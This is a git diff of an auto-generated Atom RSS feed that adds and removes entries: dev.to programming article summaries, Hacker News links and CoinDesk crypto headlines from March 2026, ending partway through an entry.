@@ -2,10 +2,365 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://JokerHin.github.io/RSS-Reader/index.html</id>
     <title>Kar Hin RSS Feed</title>
-    <updated>2026-03-18T13:09:04.201Z</updated>
+    <updated>2026-03-18T15:01:21.812Z</updated>
     <generator>osmosfeed 1.15.1</generator>
     <link rel="alternate" href="https://JokerHin.github.io/RSS-Reader/index.html"/>
     <link rel="self" href="https://JokerHin.github.io/RSS-Reader/feed.atom"/>
+    <entry>
+        <title type="html"><![CDATA[Claude CodeでPipes and Filtersパターンを設計する：データ変換パイプライン・ミドルウェアチェーン・型安全な処理]]></title>
+        <id>https://dev.to/myougatheaxo/claude-codedepipes-and-filterspatanwoshe-ji-surudetabian-huan-paipurainmidoruueatienxing-an-quan-nachu-li-1df4</id>
+        <link href="https://dev.to/myougatheaxo/claude-codedepipes-and-filterspatanwoshe-ji-surudetabian-huan-paipurainmidoruueatienxing-an-quan-nachu-li-1df4"/>
+        <updated>2026-03-18T15:00:00.000Z</updated>
+        <summary type="html"><![CDATA[はじめに
+
+
+「データ変換の処理が増えるたびにサービスが肥大化している」——Pipes and Filtersパターンで各変換ステップを独立したFilterにし、Pipeline（パイプ）で組み合わせて再利用可能なデータ変換チェーンを構築する設計をClaude Codeに生成させる。
+## Pipes and Filters設計ルール
+
+### Filterの設計
+- 各Filterは単一責任（1つの変換だけを行う）
+- 入力と出力の型を明示（TypeScript Generics）
+- Filterはステートレス（状態を持たない）
+- エラーはFilterがスローしてPipelineがキャッチ
+
+### Pipeline構成
+- Filterを配列で順番に指定
+- 途中でエラーが出たら後続のFilterは実行しない
+- 非同期FilterとStream Filterを混在可能
+
+### テスト容易性
+- 各Filterは独立してテスト可能（入力→出力の純粋関数）
+- Pipelineは結合テスト（全Filterの連結）
+
+Pipes and Filtersパターンを設計してください。
+
+要件：
+- 型安全なGenericパイプライン
+- 非同期Filter対応
+- エラーハンドリング
+- 条件付きFilter（スキップ可能）
+
+生成ファイル: src/pipeline/
+
+// src/pipeline/pipeline.ts — 型安全なパイプラインエンジン
+
+export type Filter<TIn, TOut> = (input: TIn, context: PipelineContext) => Promise<TOut> | TOut;
+
+export interface ConditionalFilter<TIn, TOut> {
+  filter: Fi…]]></summary>
+        <author>
+            <name>myougaTheAxo</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[From Web Table to Pandas DataFrame in 30 Seconds]]></title>
+        <id>https://dev.to/circobit/from-web-table-to-pandas-dataframe-in-30-seconds-3gao</id>
+        <link href="https://dev.to/circobit/from-web-table-to-pandas-dataframe-in-30-seconds-3gao"/>
+        <updated>2026-03-18T15:00:00.000Z</updated>
+        <summary type="html"><![CDATA[You found the perfect dataset on a website. Now you need it in Pandas.
+The traditional approach:
+import pandas as pd
+
+# Hope the website structure is simple
+tables = pd.read_html('https://example.com/data')
+
+# Guess which table you want
+df = tables[0]  # Maybe? Let's see...
+
+# Discover the problems
+print(df.dtypes)
+# Everything is 'object' (string)
+# Numbers have commas
+# Dates are unparseable
+# Column names have spaces
+
+# Spend 30 minutes cleaning...
+
+Let me show you a faster way.
+pd.read_html()
+
+
+Pandas' read_html() is convenient but limited:
+No table selection — It grabs all tables. You guess which index you need.
+
+
+No cleaning — Numbers like "1,234,567" stay as strings.
+
+
+CORS issues — Many sites block programmatic access.
+
+
+JavaScript rendering — Dynamic tables don't exist in the raw …]]></summary>
+        <author>
+            <name>circobit</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Production LLM 도구의 신뢰성 문제를 해결하는 아키텍처 패턴]]></title>
+        <id>https://dev.to/ji_ai/production-llm-doguyi-sinroeseong-munjereul-haegyeolhaneun-akitegceo-paeteon-1ig2</id>
+        <link href="https://dev.to/ji_ai/production-llm-doguyi-sinroeseong-munjereul-haegyeolhaneun-akitegceo-paeteon-1ig2"/>
+        <updated>2026-03-18T14:59:49.000Z</updated>
+        <summary type="html"><![CDATA[LLMMixer라는 CLI-to-LLM 브릿지 도구의 production readiness를 확보하는 작업을 했다. 이 글에서는 interactive CLI 처리, adapter pattern 설계, SSE deduplication 등 복잡한 멀티모델 도구에서 마주치는 신뢰성 문제를 AI와 함께 해결한 과정을 다룬다.
+LLMMixer는 Claude, GPT, Gemini 등 여러 LLM을 하나의 인터페이스로 섞어 쓸 수 있는 도구다. 사용자가 터미널 명령어를 입력하면 LLM이 실행하고, 결과를 웹 대시보드에서 실시간으로 볼 수 있다. 
+v0.3에서는 node-pty를 도입해 interactive CLI 지원을 추가했다. npm install -g some-cli처럼 사용자 입력이 필요한 명령어도 처리할 수 있게 됐다. 하지만 production에서 쓰려면 신뢰성 문제부터 해결해야 했다.
+주요 목표:
+Interactive CLI 명령어 안정적 처리
+멀티 어댑터 간 consistency 확보
+
+SSE 중복 이벤트 제거
+Singleton 인스턴스 persistence 보장
+node-pty는 pseudo-terminal을 만들어서 실제 shell처럼 동작한다. 문제는 이 패키지가 네이티브 모듈이라 import 시점에 실패할 수 있다는 점이다.
+AI에게 이런 문제를 해결하게 할 때는 제약 조건을 명확히 줘야 한다:
+node-pty를 lazy loading으로 처리해서 import 실패 시에도 애플리케이션이 죽지 않게 만들어줘. 조건:
+interactive 모드가 아닐 때는 node-pty를 로드하지 않는다
+import…]]></summary>
+        <author>
+            <name>jidong</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[I built my first real web app after months of learning. Here it is.]]></title>
+        <id>https://dev.to/imanssai/i-built-my-first-real-web-app-after-months-of-learning-here-it-is-4lbp</id>
+        <link href="https://dev.to/imanssai/i-built-my-first-real-web-app-after-months-of-learning-here-it-is-4lbp"/>
+        <updated>2026-03-18T14:59:14.000Z</updated>
+        <summary type="html"><![CDATA[I've been learning to code for a few months now. Lots of tutorials, lots of half-finished projects that never saw the light of day.
+This one is different. I actually shipped it.
+It's called CodeVault. The idea is simple — I kept losing useful pieces of code I'd written and having to rewrite them from scratch every time. Copy-pasting into notes apps, scattered across files, impossible to find later. I wanted one place to save everything.
+So I built it.
+🔗 Live: https://codevault-production-86f2.up.railway.app
+https://github.com/IManss-ai/codevault
+It's a code snippet manager. You save snippets, tag them, search them, make them public or private. There's syntax highlighting for 25+ languages, public profiles, a REST API, and you can even embed snippets on other websites.
+I built it with PHP (no frameworks — I wanted to actually understand what's happening), Supabase for the database, and vanilla JavaScript.
+The hardest parts were debugging things I didn't understand yet, and deployment. Getting it running locally was one thing. Getting it actually live on the internet broke me for a while. Wrong PHP drivers, server config conflicts, routing issues — things that tutorials never warn you about.
+But it's live now. Real URL, real database, real users can sign up.
+I'm sharing this because I want feedback from people who actually know what they're doing. What's broken? What's ugly? What would you do differently?
+And if you find it useful, a star on GitHub would genuinely make my day ⭐
+Thanks for reading.]]></summary>
+        <author>
+            <name>IManss-ai</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Claude Code Tools: Best Practices for Real Productivity]]></title>
+        <id>https://dev.to/godinhojoao/claude-code-tools-best-practices-for-real-productivity-295g</id>
+        <link href="https://dev.to/godinhojoao/claude-code-tools-best-practices-for-real-productivity-295g"/>
+        <updated>2026-03-18T14:57:48.000Z</updated>
+        <summary type="html"><![CDATA[Introduction
+
+
+
+In this article I'll show you the most important, but not all available, tools to improve productivity using Claude Code. I'll do it following a popular quote from a renowned author, from Discourse on the Method:
+
+
+“States with fewer laws are often better governed, provided those laws are strictly followed.” - René Descartes
+In our analogy, it means: “Better to follow specific tools and concepts than trying to incorrectly embrace everything.”
+I'll skip obvious and generic tips for coding with AI that you should already know in 2026, such as:
+
+
+“Provide good prompts with the entire context of what you want”
+Using existing code to tell AI to follow a pattern: “Develop a calendar component following the same pattern used in the DatePicker component file”
+And more listed here: …]]></summary>
+        <author>
+            <name>João Godinho</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[When AI Agents Get It Wrong: The Accountability Crisis in Multi-Agent Systems]]></title>
+        <id>https://dev.to/mbogan/when-ai-agents-get-it-wrong-the-accountability-crisis-in-multi-agent-systems-2l02</id>
+        <link href="https://dev.to/mbogan/when-ai-agents-get-it-wrong-the-accountability-crisis-in-multi-agent-systems-2l02"/>
+        <updated>2026-03-18T14:57:43.000Z</updated>
+        <summary type="html"><![CDATA[In the world of security and DevOps, AI agents are being pushed from demos into production quickly. They triage security alerts, coordinate incident response, provision infrastructure, and decide which remediation playbooks to run. 
+When it all works, everyone is happy. It’s a force multiplier.  But when an AI agent fails … who do you blame? 
+It can be hard to tell who made the call, why it happened, or what evidence exists to explain it. This is even more difficult in multi-agent systems, where responsibility is distributed across models, tools, orchestrators, and human operators. This distribution is powerful, but it also creates an accountability gap that most teams aren’t prepared for. 
+This is not a theoretical issue. Regulators and standards bodies are converging on real expectations…]]></summary>
+        <author>
+            <name>Michael Bogan</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Railway-Oriented Programming in C# — without LanguageExt]]></title>
+        <id>https://dev.to/daniele_frau/railway-oriented-programming-in-c-without-languageext-4noe</id>
+        <link href="https://dev.to/daniele_frau/railway-oriented-programming-in-c-without-languageext-4noe"/>
+        <updated>2026-03-18T14:56:29.000Z</updated>
+        <summary type="html"><![CDATA[If you've ever tried to bring functional error handling into a C# codebase, you've probably landed on LanguageExt. It's powerful. It's also 42 million downloads worth of a paradigm shift that turns your entire codebase inside out.
+This article is about a lighter path: Railway-Oriented Programming with MonadicSharp, a zero-dependency library that fits into your existing .NET 8 code without asking you to rewrite everything.
+Scott Wlaschin's Railway-Oriented Programming describes a simple idea: every operation in your system runs on two tracks — a success track and a failure track. Once you leave the success track, you stay on the failure track. No re-entry.
+Input ──► Validate ──► Fetch from DB ──► Process ──► Save ──► Output
+             │               │               │           │
+        …]]></summary>
+        <author>
+            <name>Daniele Frau</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[What Zari-Zardozi Teaches Us About Agent Coordination]]></title>
+        <id>https://dev.to/talvinder/what-zari-zardozi-teaches-us-about-agent-coordination-4dfp</id>
+        <link href="https://dev.to/talvinder/what-zari-zardozi-teaches-us-about-agent-coordination-4dfp"/>
+        <updated>2026-03-18T14:55:25.000Z</updated>
+        <summary type="html"><![CDATA[In a Zari-Zardozi workshop in Old Delhi, six artisans work on a single bridal dupatta. One creates the base pattern. Another applies the metallic thread. A third adds sequins. A fourth handles the edge work. They don't talk much. They don't pass the fabric in strict sequence. Yet the final piece is coherent---every motif aligned, every border continuous, every layer building on the last.
+This is not romantic craft nostalgia. This is a coordination architecture that's been production-tested for 400 years.
+I'm calling this pattern Layered Autonomy---not because the world needs another framework, but because most multi-agent AI systems fail at exactly what Zari-Zardozi solves: how to give workers genuine autonomy while maintaining system-level coherence.
+The dominant pattern is the command-an…]]></summary>
+        <author>
+            <name>Talvinder Singh</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Why Consensus Voting Fails for Agent Truthfulness]]></title>
+        <id>https://dev.to/talvinder/why-consensus-voting-fails-for-agent-truthfulness-105f</id>
+        <link href="https://dev.to/talvinder/why-consensus-voting-fails-for-agent-truthfulness-105f"/>
+        <updated>2026-03-18T14:55:21.000Z</updated>
+        <summary type="html"><![CDATA[Pass@k is the most popular reliability pattern in production agent systems right now. Run the same task k times, take a majority vote on the output, ship the consensus answer. It works beautifully for code generation — a function either passes the test suite or it doesn't. The objective verification is external to the agents.
+For factual accuracy, the pattern collapses. And most teams deploying it haven't figured out why yet.
+The failure is structural, not probabilistic. Consensus voting assumes that errors are independent and randomly distributed. If Agent A hallucinates, Agent B probably won't hallucinate the same thing. With enough agents, truth wins by majority. This assumption holds for coding tasks because the test suite is the arbiter. It does not hold for factual claims because the…]]></summary>
+        <author>
+            <name>Talvinder Singh</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[YouTube's Deepfake Detection Tool Just Changed the Rules for Video Evidence]]></title>
+        <id>https://dev.to/caracomp/youtubes-deepfake-detection-tool-just-changed-the-rules-for-video-evidence-59ob</id>
+        <link href="https://dev.to/caracomp/youtubes-deepfake-detection-tool-just-changed-the-rules-for-video-evidence-59ob"/>
+        <updated>2026-03-18T14:54:01.000Z</updated>
+        <summary type="html"><![CDATA[YouTube's move to standardize video authentication signals a massive shift for developers in the computer vision and biometrics space. By expanding likeness detection technology to public figures, we are seeing the emergence of "Detection-as-a-Service" as a platform-level standard. For those of us building facial comparison or forensic tools, this news isn't just about a new YouTube feature—it's about the technical bar for video evidence being raised for every investigator and developer in the field.
+YouTube’s system is reportedly built on the same architecture as Content ID, which relies on high-dimensional hashing and fingerprinting at scale. For computer vision developers, this means the industry is moving away from simple heuristic-based detection toward robust, multi-modal verificatio…]]></summary>
+        <author>
+            <name>CaraComp</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[I Built a Full SaaS Product in 10 days While Working a Full-Time Job. Here’s Exactly How.]]></title>
+        <id>https://dev.to/melvinprince/i-built-a-full-saas-product-in-10-days-while-working-a-full-time-job-heres-exactly-how-fe7</id>
+        <link href="https://dev.to/melvinprince/i-built-a-full-saas-product-in-10-days-while-working-a-full-time-job-heres-exactly-how-fe7"/>
+        <updated>2026-03-18T14:53:49.000Z</updated>
+        <summary type="html"><![CDATA[There is this idea floating around that building a SaaS product takes months. Maybe even a year. You need a team, a runway, a pitch deck, and a whole lot of coffee.
+I am here to tell you that is not always true.
+This is not a humble brag. This is a breakdown of exactly how I did it, what stack I used, how I structured the project, and what decisions saved me the most time. If you are a developer sitting on an idea, maybe this will push you to just start.
+The Problem I Wanted to Solve
+Landlords who manage somewhere between 5 and 15 rental units have almost no good tools. The big property management platforms are built for companies managing hundreds of units. They are bloated, confusing, and expensive. We are talking $35 to $60 per month, often with per-unit fees on top.
+So what do most ind…]]></summary>
+        <author>
+            <name>Melvin Prince</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Bitcoin hash rate is tumbling as Iran war lifts energy prices]]></title>
+        <id>75910190-640f-457f-8fef-83af9edd0e11</id>
+        <link href="https://www.coindesk.com/markets/2026/03/18/bitcoin-hash-rate-is-tumbling-as-iran-war-lifts-energy-prices"/>
+        <updated>2026-03-18T14:53:08.000Z</updated>
+        <summary type="html"><![CDATA[A falling hash rate and the resultant pressure on miners could signal another potential capitulation phase, which could push prices down further]]></summary>
+        <author>
+            <name>James Van Straten</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[A Simple Planning Poker Checklist Teams Can Actually Use]]></title>
+        <id>https://dev.to/r_abhimaan/a-simple-planning-poker-checklist-teams-can-actually-use-533o</id>
+        <link href="https://dev.to/r_abhimaan/a-simple-planning-poker-checklist-teams-can-actually-use-533o"/>
+        <updated>2026-03-18T14:52:43.000Z</updated>
+        <summary type="html"><![CDATA[Most teams don’t struggle with estimation because they lack experience.
+They struggle because they follow a loose process.
+This post gives a clear checklist to run planning poker story points properly, without confusion or wasted time.
+Full guide + resources.
+
+If planning poker sessions feel slow, inconsistent, or full of guessing, this will fix that.
+Below is a step-by-step checklist you can apply in your next sprint planning.
+Planning poker is not just voting numbers.
+It is a structured way to:
+surface hidden work
+align understanding across the team
+avoid one person deciding estimates
+At its core:
+A task is read
+Everyone picks a number privately
+All numbers are revealed together
+Differences trigger discussion
+That last step is the most important.
+If there is no discussion, planning poker…]]></summary>
+        <author>
+            <name>Rakshanda Abhimaan</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Hundreds of Millions of iPhones Can Be Hacked With a New Tool Found in the Wild]]></title>
+        <id>https://www.wired.com/story/hundreds-of-millions-of-iphones-can-be-hacked-with-a-new-tool-found-in-the-wild/</id>
+        <link href="https://www.wired.com/story/hundreds-of-millions-of-iphones-can-be-hacked-with-a-new-tool-found-in-the-wild/"/>
+        <updated>2026-03-18T14:28:40.000Z</updated>
+        <summary type="html"><![CDATA[Comments]]></summary>
+        <author>
+            <name>Hacker News</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Bank of Korea adds two banks to digital won trials as real-world testing begins]]></title>
+        <id>9f5bd6c5-4245-401a-85e6-0be831d2f05d</id>
+        <link href="https://www.coindesk.com/business/2026/03/18/bank-of-korea-adds-two-banks-to-digital-won-trials-as-real-world-testing-begins"/>
+        <updated>2026-03-18T14:19:54.000Z</updated>
+        <summary type="html"><![CDATA[Korea's central bank and nine commercial lenders started real-world testing of deposit tokens, including subsidy payments and peer-to-peer transfers.]]></summary>
+        <author>
+            <name>Olivier Acuna</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Federal Cyber Experts Called Microsoft's Cloud "A Pile of Shit", yet Approved It]]></title>
+        <id>https://www.propublica.org/article/microsoft-cloud-fedramp-cybersecurity-government</id>
+        <link href="https://www.propublica.org/article/microsoft-cloud-fedramp-cybersecurity-government"/>
+        <updated>2026-03-18T14:14:02.000Z</updated>
+        <summary type="html"><![CDATA[Comments]]></summary>
+        <author>
+            <name>Hacker News</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Stripe-led payments blockchain Tempo goes live with protocol for AI agents]]></title>
+        <id>4592bc11-bae4-4799-80bc-ae383a57d680</id>
+        <link href="https://www.coindesk.com/tech/2026/03/18/stripe-led-payments-blockchain-tempo-goes-live-with-protocol-for-ai-agents"/>
+        <updated>2026-03-18T14:05:28.000Z</updated>
+        <summary type="html"><![CDATA[The Stripe-led blockchain targets fast, low-cost digital payments and a new Machine Payments Protocol that allows AI agents pay autonomously.]]></summary>
+        <author>
+            <name>Krisztian Sandor</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[CoinDesk 20 performance update: index falls 3.1% as all constituents trade lower]]></title>
+        <id>dc6bf948-0c83-48ff-b5e3-4abcba87eead</id>
+        <link href="https://www.coindesk.com/coindesk-indices/2026/03/18/coindesk-20-performance-update-index-falls-3-1-as-all-constituents-trade-lower"/>
+        <updated>2026-03-18T14:01:26.000Z</updated>
+        <summary type="html"><![CDATA[Uniswap (UNI) declined 4.9% and Aave (AAVE) dropped 4.4%, leading the index lower.]]></summary>
+        <author>
+            <name>CoinDesk Indices</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[A ngrok-style secure tunnel server written in Rust and Open Source]]></title>
+        <id>https://github.com/joaoh82/rustunnel</id>
+        <link href="https://github.com/joaoh82/rustunnel"/>
+        <updated>2026-03-18T14:00:43.000Z</updated>
+        <summary type="html"><![CDATA[Comments]]></summary>
+        <author>
+            <name>Hacker News</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Large investors are doubling down on crypto, but getting a lot pickier about risk]]></title>
+        <id>50d6e570-c67b-47df-85e4-acaf03613078</id>
+        <link href="https://www.coindesk.com/business/2026/03/18/large-investors-are-doubling-down-on-crypto-but-getting-a-lot-pickier-about-risk"/>
+        <updated>2026-03-18T14:00:00.000Z</updated>
+        <summary type="html"><![CDATA[Most institutional investors plan to increase allocations even as concerns around regulation and risk management continue to grow.]]></summary>
+        <author>
+            <name>Helene Braun</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Quicknode Launches Support for Tempo Mainnet]]></title>
+        <id>69b98c1ed354b5000101841f</id>
+        <link href="https://blog.quicknode.com/quicknode-launches-support-for-tempo-mainnet/"/>
+        <updated>2026-03-18T13:11:57.000Z</updated>
+        <summary type="html"><![CDATA[Tempo mainnet is live on Quicknode. Deploy endpoints and start building on the payments-first blockchain incubated by Stripe and Paradigm. Sub-second finality, stablecoin-native gas, and dedicated payment lanes.]]></summary>
+        <author>
+            <name>Quicknode</name>
+        </author>
+    </entry>
     <entry>
         <title type="html"><![CDATA[Is your product invisible to AI agents?]]></title>
         <id>https://dev.to/garybotlington/is-your-product-invisible-to-ai-agents-26bj</id>
@@ -120,6 +475,16 @@ The AI is the Centurion: Orchestrates and executes.
 To achieve this, the architecture cannot be linear. We need an infrastructure that supports failures, latency…]]></summary>
         <author>
             <name>Eber Cruz</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Tech hobbyist makes shoulder-mounted guided missile prototype with $96 in parts]]></title>
+        <id>https://www.tomshardware.com/3d-printing/tech-hobbyist-makes-shoulder-mounted-guided-missile-prototype-with-usd96-in-parts-and-a-3d-printer-diy-manpads-includes-wi-fi-guidance-ballistics-calculations-optional-camera-for-tracking</id>
+        <link href="https://www.tomshardware.com/3d-printing/tech-hobbyist-makes-shoulder-mounted-guided-missile-prototype-with-usd96-in-parts-and-a-3d-printer-diy-manpads-includes-wi-fi-guidance-ballistics-calculations-optional-camera-for-tracking"/>
+        <updated>2026-03-18T13:04:15.000Z</updated>
+        <summary type="html"><![CDATA[Comments]]></summary>
+        <author>
+            <name>Hacker News</name>
         </author>
     </entry>
     <entry>
@@ -10910,6 +11275,16 @@ This process has two major problems.
 First, optimization often leads to ove…]]></summary>
         <author>
             <name>Volker Bohn</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[Using calculus to do number theory]]></title>
+        <id>https://hidden-phenomena.com/articles/hensels</id>
+        <link href="https://hidden-phenomena.com/articles/hensels"/>
+        <updated>2026-03-16T14:12:45.000Z</updated>
+        <summary type="html"><![CDATA[Comments]]></summary>
+        <author>
+            <name>Hacker News</name>
         </author>
     </entry>
     <entry>
@@ -25516,6 +25891,16 @@ This article explains how to build a video generation system combining the React
         <id>https://www.robopenguins.com/fatal_core_dump/</id>
         <link href="https://www.robopenguins.com/fatal_core_dump/"/>
         <updated>2026-03-14T00:12:44.000Z</updated>
+        <summary type="html"><![CDATA[Comments]]></summary>
+        <author>
+            <name>Hacker News</name>
+        </author>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[A Tiny Camera Revealed a Hidden Passage in the Great Pyramid]]></title>
+        <id>https://modernengineeringmarvels.com/2026/03/13/a-tiny-camera-revealed-a-hidden-passage-in-the-great-pyramid/</id>
+        <link href="https://modernengineeringmarvels.com/2026/03/13/a-tiny-camera-revealed-a-hidden-passage-in-the-great-pyramid/"/>
+        <updated>2026-03-14T00:08:16.000Z</updated>
         <summary type="html"><![CDATA[Comments]]></summary>
         <author>
             <name>Hacker News</name>
@@ -88179,291 +88564,6 @@ The post Apple Reveals Two New Studio Display Monitors; Retails From RM6,499 app
         <summary type="html"><![CDATA[Market maker Enflux says traders are not pricing catastrophe or resolution to the conflict in the Middle East, while Glassnode data shows improving spot demand but cautious derivatives positioning.]]></summary>
         <author>
             <name>Sam Reynolds</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[LLMs can unmask pseudonymous users at scale with surprising accuracy]]></title>
-        <id>https://arstechnica.com/security/2026/03/llms-can-unmask-pseudonymous-users-at-scale-with-surprising-accuracy/</id>
-        <link href="https://arstechnica.com/security/2026/03/llms-can-unmask-pseudonymous-users-at-scale-with-surprising-accuracy/"/>
-        <updated>2026-03-04T03:00:32.000Z</updated>
-        <summary type="html"><![CDATA[Comments]]></summary>
-        <author>
-            <name>Hacker News</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Mac external displays for designers and developers, part 2]]></title>
-        <id>https://bjango.com/articles/macexternaldisplays2/</id>
-        <link href="https://bjango.com/articles/macexternaldisplays2/"/>
-        <updated>2026-03-04T02:43:05.000Z</updated>
-        <summary type="html"><![CDATA[Comments]]></summary>
-        <author>
-            <name>Hacker News</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Number Research Inc]]></title>
-        <id>https://numberresearch.xyz/</id>
-        <link href="https://numberresearch.xyz/"/>
-        <updated>2026-03-04T02:34:06.000Z</updated>
-        <summary type="html"><![CDATA[Comments]]></summary>
-        <author>
-            <name>Hacker News</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Apple 14- And 16-Inch MacBook Pro With M5 Pro And M5 Max In Malaysia From RM8,999]]></title>
-        <id>https://www.lowyat.net/?p=385176</id>
-        <link href="https://www.lowyat.net/2026/385176/apple-14-16-inch-macbook-pro-m5-pro-m5-max-malaysia/"/>
-        <updated>2026-03-04T02:30:58.000Z</updated>
-        <summary type="html"><![CDATA[Apple’s week-long reveals continue. The company has officially updated its M5-powered MacBook Pro line-up by unveiling the latest 14- and 16-inch MacBook Pro models with the new M5 Pro and M5 Max chips. The newer models focus heavily on AI performance, GPU gains, and faster storage, while retaining the Liquid Retina XDR display and long […]
-The post Apple 14- And 16-Inch MacBook Pro With M5 Pro And M5 Max In Malaysia From RM8,999 appeared first on Lowyat.NET.]]></summary>
-        <author>
-            <name>Heirul Kamel</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Graphics Programming Resources]]></title>
-        <id>https://develop--gpvm-website.netlify.app/resources/</id>
-        <link href="https://develop--gpvm-website.netlify.app/resources/"/>
-        <updated>2026-03-04T02:23:01.000Z</updated>
-        <summary type="html"><![CDATA[Comments]]></summary>
-        <author>
-            <name>Hacker News</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Weave – A language aware merge algorithm based on entities]]></title>
-        <id>https://github.com/Ataraxy-Labs/weave</id>
-        <link href="https://github.com/Ataraxy-Labs/weave"/>
-        <updated>2026-03-04T01:52:21.000Z</updated>
-        <summary type="html"><![CDATA[Comments]]></summary>
-        <author>
-            <name>Hacker News</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[The Server-Side Mocking Gap Nobody Talks About]]></title>
-        <id>https://dev.to/rrafatpanah/the-server-side-mocking-gap-nobody-talks-about-36jb</id>
-        <link href="https://dev.to/rrafatpanah/the-server-side-mocking-gap-nobody-talks-about-36jb"/>
-        <updated>2026-03-04T01:44:04.000Z</updated>
-        <summary type="html"><![CDATA[When single page apps (SPAs) were the dominant architecture, end-to-end testing (E2E) was more straightforward than it is today. Your app lived in the browser, your data came from an API, and most API requests were initiated from the browser. Popular E2E tools like Cypress could intercept and mock those requests.
-Modern fullstack frameworks have changed that. In Next.js, Remix (React Router v7), and TanStack Start, loaders, actions, server components, and server functions all execute on the server which is outside the reach of E2E tooling.
-This post outlines the approach we've landed on at Anedot after nine months of using it in production. Before getting into the implementation, let's first define what a good solution looks like.
-Mock the boundaries of the app
-Each test owns its mocks exp…]]></summary>
-        <author>
-            <name>Raphael Rafatpanah</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Fine-tuning vs RAG: Cuándo Usar Cada Enfoque para LLMs en Producción]]></title>
-        <id>https://dev.to/synsun/fine-tuning-vs-rag-cuando-usar-cada-enfoque-para-llms-en-produccion-1ook</id>
-        <link href="https://dev.to/synsun/fine-tuning-vs-rag-cuando-usar-cada-enfoque-para-llms-en-produccion-1ook"/>
-        <updated>2026-03-04T01:40:29.000Z</updated>
-        <summary type="html"><![CDATA[Fine-tuning vs RAG: Cuándo Usar Cada Enfoque para LLMs en Producción
-
-
-Tienes un modelo de lenguaje y un problema concreto que resolver. El modelo no sabe suficiente sobre tu dominio, responde de forma genérica o simplemente no maneja el tono y formato que necesitas. La pregunta surge inevitablemente: ¿entreno el modelo con mis datos, o le doy acceso a una base de conocimiento externa?
-Esta decisión —fine-tuning vs RAG— tiene consecuencias reales: en costos de infraestructura, en la frescura de las respuestas, en el esfuerzo de mantenimiento y en cuánto control tenés sobre el comportamiento del modelo. No existe una respuesta universal, pero sí existe una forma sistemática de llegar a la correcta para tu caso.
-RAG (Retrieval-Augmented Generation) conecta un LLM a una fuente de información …]]></summary>
-        <author>
-            <name>Moon Robert</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Predict House Prices with Python: A Beginner’s Machine Learning Guide]]></title>
-        <id>https://dev.to/temiloluwavalentine/predict-house-prices-with-python-a-beginners-machine-learning-guide-k6p</id>
-        <link href="https://dev.to/temiloluwavalentine/predict-house-prices-with-python-a-beginners-machine-learning-guide-k6p"/>
-        <updated>2026-03-04T01:34:30.000Z</updated>
-        <summary type="html"><![CDATA[Theory is important. But it only matters when you build something real.
-So let’s build.
-In this article, you’ll learn how to predict house prices using machine learning.
-Not a toy example. A real regression problem that real estate companies, investors, and data scientists solve every day.
-You’ll understand:
-How to structure data for a model
-How to train a machine learning system
-How to test if it actually works
-How to make predictions on new data
-By the end, you’ll have built your first machine learning model. And more importantly, you’ll understand the process, because this same process works for predicting stock prices, weather, customer churn, or anything else.
-Let’s go.
-Step 1: Get Your Data
-Machine learning starts with data. You need examples to learn from.
-For this project, we’re us…]]></summary>
-        <author>
-            <name>Temiloluwa Valentine</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Apple M5 Pro, M5 Max Chips Announced With “Fusion Architecture”]]></title>
-        <id>https://www.lowyat.net/?p=385170</id>
-        <link href="https://www.lowyat.net/2026/385170/apple-m5-pro-m5-max/"/>
-        <updated>2026-03-04T01:33:30.000Z</updated>
-        <summary type="html"><![CDATA[As part of its week of product launches, Apple has announced two new additions to its line of M-series processors. The M5 Pro and M5 Max serve as the brand’s most advanced chips thus far, promising performance gains thanks to the new “Fusion Architecture”. This design combines two 3nm dies into a single SoC. The […]
-The post Apple M5 Pro, M5 Max Chips Announced With “Fusion Architecture” appeared first on Lowyat.NET.]]></summary>
-        <author>
-            <name>Nurul Kamil</name>
-        </author>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[Agentic CI: How I Test AI Workers Like Services (Securely)]]></title>
-        <id>https://dev.to/kowshik_jallipalli_a7e0a5/agentic-ci-how-i-test-ai-workers-like-services-securely-31ed</id>
-        <link href="https://dev.to/kowshik_jallipalli_a7e0a5/agentic-ci-how-i-test-ai-workers-like-services-securely-31ed"/>
-        <updated>2026-03-04T01:33:12.000Z</updated>
